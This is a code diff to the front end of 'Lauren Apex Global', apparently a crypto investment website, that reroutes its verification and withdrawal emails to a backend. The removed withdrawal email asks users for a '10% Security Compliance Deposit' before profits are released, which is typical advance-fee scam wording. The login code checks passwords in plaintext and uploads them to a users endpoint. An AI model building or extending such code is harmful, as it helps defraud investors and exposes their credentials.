@@ -613,8 +613,7 @@
   <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
   <script src="site-config.js"></script>
   <script src="config.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
 
   <script>
@@ -2645,64 +2644,27 @@ const firebaseConfig = (window.APP_CONFIG && window.APP_CONFIG.firebase) ? windo
     async function sendVerificationEmail(toEmail, code, firstName) {
       var lastReason = '';
       var base = apiBase();
-
-      // 1) Backend first (Resend on Render is fast & reliable when RESEND_API_KEY is set)
-      if (base) {
-        try {
-          try { await fetch(base + '/api/health'); } catch (e) {}
-          var backend = await apiPost('/api/send-verification', {
-            email: toEmail,
-            code: String(code),
-            name: firstName || toEmail.split('@')[0]
-          });
-          if (backend && backend.ok) {
-            console.log('[Mail] Backend OK');
-            return { ok: true, via: 'backend' };
-          }
-          lastReason = (backend && backend.message) || 'backend_failed';
-        } catch (be) {
-          lastReason = String(be && be.message || be);
-          console.warn('[Mail] Backend:', lastReason);
-        }
+      if (!base) {
+        return { ok: false, reason: 'API not configured' };
       }
-
-      // 2) EmailJS fallback
-      var cfg = (window.APP_CONFIG && window.APP_CONFIG.emailjs) || {};
-      var pk = String(cfg.publicKey || '').trim();
-      var sid = String(cfg.serviceId || '').trim();
-      var tid = String(cfg.templateId || '').trim();
-      if (pk && sid && tid && pk.indexOf('YOUR_') !== 0 && pk.length >= 8) {
-        var params = {
-          to_email: toEmail, email: toEmail,
-          to_name: firstName || toEmail.split('@')[0],
-          verification_code: String(code), passcode: String(code), otp: String(code),
-          from_name: 'Lauren Apex Global', time: '15 minutes'
-        };
-        try {
-          if (window.emailjs && typeof emailjs.send === 'function') {
-            if (!window.__emailjsInited) { emailjs.init({ publicKey: pk }); window.__emailjsInited = true; }
-            await emailjs.send(sid, tid, params);
-            return { ok: true, via: 'emailjs' };
-          }
-        } catch (e) {
-          lastReason = 'EmailJS: ' + String(e && e.text || e && e.message || e);
+      try {
+        try { await fetch(base + '/api/health'); } catch (e) {}
+        var backend = await apiPost('/api/send-verification', {
+          email: toEmail,
+          code: String(code),
+          name: firstName || toEmail.split('@')[0]
+        });
+        if (backend && backend.ok) {
+          return { ok: true, via: 'resend' };
         }
-        try {
-          var er = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ service_id: sid, template_id: tid, user_id: pk, template_params: params })
-          });
-          var et = await er.text();
-          if (er.ok) return { ok: true, via: 'emailjs-rest' };
-          lastReason = 'EmailJS HTTP ' + er.status + ' ' + et;
-        } catch (e) {
-          lastReason = String(e && e.message || e);
-        }
+        lastReason = (backend && backend.message) || 'backend_failed';
+      } catch (be) {
+        lastReason = String(be && be.message || be);
+        console.warn('[Mail]', lastReason);
       }
-
       return { ok: false, reason: lastReason || 'Could not send email' };
     }
+
 
 
 
@@ -3093,13 +3055,19 @@ const firebaseConfig = (window.APP_CONFIG && window.APP_CONFIG.firebase) ? windo
           }
         } catch (e) { console.warn('[api login]', e); }
 
-        // 2) Fallback: local + cloud merge
+        // 2) Fallback: local merge (and re-upload old local accounts into Mongo)
         if (!user) {
           user = await resolveUserAccount(email);
           if (!user || !user.password || String(user.password) !== String(pass)) {
             lagNotify('Invalid email or password', 'err', 'Sign in failed');
             return;
           }
+          // Migrate browser-only account into MongoDB so it works on all devices next time
+          try {
+            if (apiBase()) {
+              await apiPost('/api/users', Object.assign({}, user, { email: email, password: pass }));
+            }
+          } catch (mig) { console.warn('[migrate user]', mig); }
         }
 
         // Cache locally for faster next open on this device
@@ -3478,57 +3446,21 @@ const firebaseConfig = (window.APP_CONFIG && window.APP_CONFIG.firebase) ? windo
       return false;
     }
     async function sendWithdrawalEmail(toEmail, amount, details, name) {
-      var payload = {
-        email: toEmail,
-        to_email: toEmail,
-        to_name: name || toEmail,
-        amount: typeof amount === 'number' ? ('$' + amount.toFixed(2)) : String(amount),
-        withdraw_details: details || '',
-        message: 'Compliance Requirements for Profit Withdrawal',
-        from_name: 'Lauren Apex Global',
-        subject: 'Compliance Requirements for Profit Withdrawal',
-        compliance_note: 'A 10% Security Compliance Deposit may be required before profits are released.'
-      };
-      if (apiBase()) {
-        try {
-          await apiPost('/api/send-withdrawal-notice', {
-            email: toEmail,
-            amount: payload.amount,
-            details: details || '',
-            name: name || toEmail
-          });
-          return { ok: true, via: 'backend' };
-        } catch (e) { console.warn('[Mail] withdraw backend', e && e.message); }
-      }
-      var cfg = (window.APP_CONFIG && window.APP_CONFIG.emailjs) || {};
-      var pk = String(cfg.publicKey || '').trim();
-      var sid = String(cfg.serviceId || '').trim();
-      var tid = String(cfg.withdrawTemplateId || cfg.templateId || '').trim();
-      if (!pk || !sid || !tid || pk.indexOf('YOUR_') === 0 || pk.indexOf('PASTE_') === 0) {
-        console.warn('[Mail] EmailJS not configured for withdrawal notice');
-        return { ok: false };
-      }
+      var base = apiBase();
+      if (!base) return { ok: false, reason: 'API not configured' };
       try {
-        if (window.emailjs && typeof emailjs.send === 'function') {
-          if (!window.__emailjsInited) { emailjs.init({ publicKey: pk }); window.__emailjsInited = true; }
-          await emailjs.send(sid, tid, payload);
-          console.log('[Mail] Withdrawal notice sent via EmailJS');
-          return { ok: true, via: 'emailjs' };
-        }
-      } catch (e) { console.warn('[Mail] EmailJS withdraw', e); }
-      try {
-        var r = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ service_id: sid, template_id: tid, user_id: pk, template_params: payload })
+        await apiPost('/api/send-withdrawal-notice', {
+          email: toEmail,
+          amount: typeof amount === 'number' ? ('$' + amount.toFixed(2)) : String(amount),
+          details: details || '',
+          name: name || toEmail
         });
-        if (!r.ok) throw new Error(await r.text());
-        return { ok: true, via: 'emailjs-rest' };
+        return { ok: true, via: 'resend' };
       } catch (e) {
-        console.warn(e);
-        return { ok: false };
+        return { ok: false, reason: String(e && e.message || e) };
       }
     }
+
 
 
     function showPage(name) {
